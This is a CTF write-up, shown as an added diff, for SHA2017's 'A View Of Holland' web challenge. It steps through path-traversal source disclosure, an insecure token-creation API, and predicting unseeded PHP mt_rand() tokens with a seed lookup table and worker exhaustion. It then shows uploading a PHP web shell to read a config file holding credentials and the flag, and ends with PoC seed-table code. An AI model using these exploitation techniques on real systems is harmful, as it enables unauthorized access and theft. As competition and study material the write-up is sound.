@@ -1,0 +1,369 @@
+The Web400 challenge from SHA2017 CTF was called "A View Of Holland" and
+resembles something like a minimalistic image sharing board.
+
+Upon loading the page, lots of thumbnails are loaded:
+
+============================================================================
+GET /images/thumbs/3a689ccb-9604-d5eafbeb-0bab-304da67e HTTP/1.1
+Host: viewofholland.stillhackinganyway.nl
+[...]
+============================================================================
+
+If you want the full-sized image, you could guess the path and omit the
+"thumbs" folder:
+
+http://viewofholland.stillhackinganyway.nl/images/3a689ccb-9604-d5eafbeb-0bab-304da67e
+
+In fact, this URL will deliver the real image. However, when you click on an
+image, a request like the following is generated:
+
+============================================================================
+GET /showimage.php?file=3a689ccb-9604-d5eafbeb-0bab-304da67e HTTP/1.1
+Host: viewofholland.stillhackinganyway.nl
+[...]
+============================================================================
+
+It seems strange to have a PHP file named "showimage.php" for a task that
+could very well be handled by any regular webserver. Furthermore, the HTTP
+GET parameter "file" may indicate that the images are fetched directly from
+disk according to this user-supplied value.
+
+If the images delivered by "showimage.php" are located in image/, then one
+could simply try to include the code of "../showimage.php" itself by accessing
+the following URL:
+
+http://viewofholland.stillhackinganyway.nl/showimage.php?file=../showimage.php
+
+While this does not render in a browser due to its content type, the HTTP
+reply contains the follwing:
+
+============================================================================
+HTTP/1.1 200 OK
+Date: Thu, 10 Aug 2017 17:25:17 GMT
+Server: Apache/2.4.18 (Ubuntu)
+X-Powered-By: PHP/5.6.32-dev
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 627
+Connection: close
+Content-Type: image/png;
+
+<?php
+
+include "utils/Init.php";
+
+/*
+ *   Shows Image from images/
+ */
+
+$path = dirname(__FILE__);
+$image_dir = "images";
+
+$image = filter_input (INPUT_GET, "file", FILTER_SANITIZE_STRING);
+
+// Always show an image
+header("Content-type: image/png;");
+
+try {
+    $img_path = realpath("$path/$image_dir/$image");
+    if (is_file($img_path) && preg_match(",^$path/$imagedir,", $img_path) === 1){
+       echo file_get_contents($img_path);
+       Utilities::viewImage($image);
+    }  else {
+       throw new Exception("File not found");
+    }
+} catch(Exception $e) {
+    Utilities::logError("ImageView: " + $e->getMessage());
+}
+
+?>
+============================================================================
+
+By this, you can disclose one can also disclose utils/Init.php:
+
+http://viewofholland.stillhackinganyway.nl/showimage.php?file=../utils/Init.php
+
+============================================================================
+<?php
+
+/* 
+ * This server runs on PHP-5.6 on Ubuntu 16.04.
+ * 
+ * Compiled as follows:
+ *
+ *  # apt-get install apache2 mysql-server build-essential git autoconf automake libapache2-mpm-itk apache2-dev libxml2-dev
+ *  # dpkg -i bison_2.7.1.dfsg-1_amd64.deb  libbison-dev_2.7.1.dfsg-1_amd64.deb
+ *  # git clone https://github.com/php/php-src
+ *  # cd php-src
+ *  # git checkout PHP-5.6
+ *  # ./buildconf
+ *  # ./configure --prefix=/opt/php --with-config-file-path=/opt/php/etc --enable-maintainer-zts  --with-pdo-mysql \
+ *                --with-mysqli --enable-mbstring --with-apxs2=/usr/bin/apxs
+ *  # make -j $(cat /proc/cpuinfo | grep processor|wc -l)
+ *  # make install
+ */
+
+spl_autoload_register(function($class_name) {
+    include $class_name . '.php';
+});
+
+if(!session_id()) {
+    /* session_start() uses php_combined_lcg() twice the first time, 
+     * and once every other call in the same session
+     * Consider this a hint ;-)
+     */ 
+    session_start();
+}
+============================================================================
+
+This already tells a lot, most importantly that we are on the right track.
+
+If you register with the web service, you see a minimal user interface. You
+have three options:
+
+* Profile -> Change your password
+* Tokens  -> Generate API token for your account
+* Upload  -> Upload an image
+
+The upload function looks quite promising, but the web service tells us that
+image uploads are restricted to admin users. As we are a regular use, we can
+not use this function.
+
+The next interesting option is the token function. If we want a new token for
+our account, we simply need to click on the button with the label "Create New
+Token". It then gives us a token similar to the following:
+
+baca9f2f-39d4-b6fe4c6c-415b-4fbe26e8
+
+At the hyper text transfer protocol level the token generation request looks
+like this:
+
+============================================================================
+POST /api.php HTTP/1.1
+Host: viewofholland.stillhackinganyway.nl
+[...]
+
+action=create_token&user=test123456
+
+HTTP/1.1 200 OK
+[...]
+
+[["success",true],["message","Token added."]]
+============================================================================
+
+This request looks rather odd: The web serivce could very well identify the
+user for which the token should be created by the PHPSESSID which we were
+assigned during login. Instead, it expects the "user" parameter to duplicate
+that piece of information. If we register a second account, we can verify that
+Alice is indeed able to generate admin tokens for Bob's account. However, Alice
+only learns about her own tokens by requesting:
+
+============================================================================
+POST /api.php HTTP/1.1
+Host: viewofholland.stillhackinganyway.nl
+[..]
+
+action=get_tokens
+
+HTTP/1.1 200 OK
+[...]
+
+[["success",true],["message","Retrieved tokens."],["data",[{"token":"baca9f2f-39d4-b6fe4c6c-415b-4fbe26e8"}]]]
+============================================================================
+
+The idea behind this challenge becomes a bit clearer: One should probably
+obtain an admin token to access the restricted upload function. But if the API
+does not hand out tokens, we must find another way to get them. As we have a
+file inclusion vulnerability, we could examine the code relevant for token
+generation. By downloading more and more PHP files, you learn that there is
+"utils/Utilities.php" which contains the following:
+
+============================================================================
+<?php
+
+class Utilities {
+    /*
+     * Create a random Token based on a SHA-1 hash over a value created with mt_rand()
+     * This way the mt_rand() output can't be used to calculate the used seed. 
+     * http://www.openwall.com/php_mt_seed/
+     */
+    function createNewToken(){
+        $len = mt_rand(16, 32);
+    
+    $rnd = '';
+        for($i=0; $i<$len; $i++) $rnd .= sprintf('%04d', mt_rand(0, 9999));
+        $rnd = hash('sha1', $rnd);
+        return substr($rnd, 0, 8).'-'.substr($rnd, 8, 4).'-'.substr($rnd, 12, 8).'-'.substr($rnd, 20, 4).'-'.substr($rnd, 24, 8);
+    }
+
+[...]
+
+    /*
+     * Log an Error to the log file with a uniqid as error id
+     */
+    function logError($msg){
+        $msg = "ERROR " . uniqid("", true) . ": $msg";
+        return self::logMessage($msg, False, False);
+    }
+
+[...]
+============================================================================
+
+The generated tokens are based on mt_rand() output being fed to the SHA-1
+function. If you examine the whole PHP application carefully, you will find
+that it never invokes mt_srand(). Therefore, PHP tries its best initialize the
+PRNG for you. How exactly it does that can be inferred from the PHP source
+code. Fortunately, we know quite well what version is being run from the
+comments in Init.php. If we clone the repo and checkout the 5.6 branch, we can
+find the relevant code in ext/standard/rand.c:
+
+============================================================================
+PHP_FUNCTION(mt_rand)
+{
+
+[...]
+    if (!BG(mt_rand_is_seeded)) {
+        php_mt_srand(GENERATE_SEED() TSRMLS_CC);
+    }
+[...]
+============================================================================
+
+So if we run mt_rand() without seeding, it will use whatever GENERATE_SEED()
+returns for seeding. On non-Windows system this is (see
+ext/standard/php_rand.h):
+
+============================================================================
+[...]
+#define GENERATE_SEED() (((long) (time(0) * getpid())) ^ ((long) (1000000.0 * php_combined_lcg(TSRMLS_C))))
+[...]
+PHPAPI void php_mt_srand(php_uint32 seed TSRMLS_DC);
+[...]
+============================================================================
+
+So if we knew the seed, we could efficiently predict tokens. If you have read
+the paper "I Forgot Your Password: Randomness Attacks Against PHP Applications"
+by George Argyros and Aggelos Kiayias [0] you may already know what to do next.
+If not, let me explain the idea:
+
+1) As we know the token generation code, we can build a lookup table for every
+   seed from 0x0 to 0xffffffff and compute two tokens consecutively for each
+   seed [1].
+2) Next, we ask the web service to generate a token for our own account. Then,
+   we can use our table to see which seed was used for our token and what token
+   would be generated next.
+3) Finally, we request a token for the admin account. The web serivce will then
+   generate exactly the same token as we have in our lookup table.
+
+To be able to find a token from the web service in our lookup table, we must
+ensure that the server-side PHP process which generates the token for our
+account, has never ever invoked mt_rand() and thus mt_srand() during its
+lifetime. In other words: it must be ensured that our token generation request
+is triggering the seeding and most importantly the very first invocation(s) of
+mt_rand().
+
+This can be achieved by exhausting all currently running PHP worker processes.
+In such a case, new PHP processes will spawn in which mt_rand() has not been
+seeded. We did that by opening 50 HTTP GET / requests and keeping the
+connections alive (assuming that there are no more than 50 worker processes).
+
+With the 51st request, we enforced that our request gets handled by a fresh PHP
+worker process. We generated a token for our user account and while still on
+the same connection we requested a new token for the account "admin".
+
+With more code analysis you will find that tokens can be used to create
+authenticated sessions on the web service without knowing the password. First,
+make a GET / to obtain an unauthenticated PHPSESSID. Then, do the following to
+elevate the PHPSESSID to the rights of the token owner:
+
+============================================================================
+POST /api.php HTTP/1.1
+Host: viewofholland.stillhackinganyway.nl
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Cookie: PHPSESSID=538cddaba72a56606953fc974c963c41
+[...]
+
+action=use_token&token=e6a3ffb6-2a2d-a97ba199-5a9b-e343968a
+
+HTTP/1.1 200 OK
+[...]
+
+[["success",true],["message","Token used successfully."]]
+============================================================================
+
+If the token belongs to a admin user, you can finally access the upload
+function and try to drop a PHP shell. Too bad, that the upload.php saves the
+final image without extension. However, it is saved under its original name in
+a temporary directory which is never cleaned up (upload.php):
+
+============================================================================
+[...]
+        // Make temporary directory
+        $imgid = Utilities::createNewToken();
+        $tmpname = Utilities::createNewToken();
+        mkdir( 'uploads/' . $tmpname );
+
+        // Move file to temporary directory
+        move_uploaded_file($_FILES['file']['tmp_name'], "uploads/$tmpname/" . $_FILES['file']['name']);
+[...]
+        if (file_exists("uploads/$tmpname/" . $_FILES['file']['name'])) {
+            copy( "uploads/$tmpname/" . $_FILES['file']['name'], "images/$imgid");
+            Utilities::insertImage($imgid, $_POST["description"]);
+
+            print '<span style="color:green">Upload succeeded</span><br>';
+            print '<a href="showimage.php?file=' . $imgid . '" target="_blank">' . $imgid . '</a>';
+[...]
+============================================================================
+
+From this code it is clear that $tmpname is computed using the same algorithm
+that is used for token generation. What did work once may also work a second
+time... Again: 50 bogus connections, upload the file on the 51st connection,
+search for the $imgid value which is returned as HTML and infer the $tmpname
+from the table. Then, you can access your shell from here:
+
+http://viewofholland.stillhackinganyway.nl/uploads/56169e09-xxxx-xxxxxxxx-xxxx-9ffa6428/test.php?x=echo%201
+
+With the help of the PHP shell, you can get the flag from the file
+/opt/viewofholland/conf/config.ini:
+
+============================================================================
+[database]
+db_name = viewofholland
+db_user = voh_user
+db_pass = c32dadfb8761bebdbf331e4092eec5f4
+
+[flag]
+flag = flag{7e127c06569044ec7cdf2f5384598524}
+============================================================================
+
+With a deeper understanding of PHP's implicit seed generation and a proper C
+implementation of PHP's mt_rand()/mt_srand() one could have cut down the
+brute-forcing effort significantly. While our solution did work out, some of us
+already anticipated that we did not develop the intended solution as we did not
+make use of the hint from Init.php. After the CTF, the organizers confirmed
+this assumption. Additionally, they told us that "Just Hit the Core" (the other
+team which solved the challenge) also found an unintended solution based on the
+predictability of PHPSESSIDs iirc.
+
+
+
+[0] https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final218.pdf
+[1] PoC code for token generation:
+============================================================================
+<?php
+function createNewToken(){
+    
+    $len = mt_rand(16, 32);
+
+    $rnd = '';
+    for($i=0; $i<$len; $i++) $rnd .= sprintf('%04d', mt_rand(0, 9999));
+    $rnd = hash('sha1', $rnd);
+    return substr($rnd, 0, 8).'-'.substr($rnd, 8, 4).'-'.substr($rnd, 12, 8).'-'.substr($rnd, 20, 4).'-'.substr($rnd, 24, 8);
+}
+
+$seed = $argv[1];
+
+mt_srand(intval($seed));
+$output = sprintf("0x%08x %s %s\n", $seed, createNewToken(), createNewToken());
+file_put_contents("tokens.txt", $output, FILE_APPEND);
+============================================================================
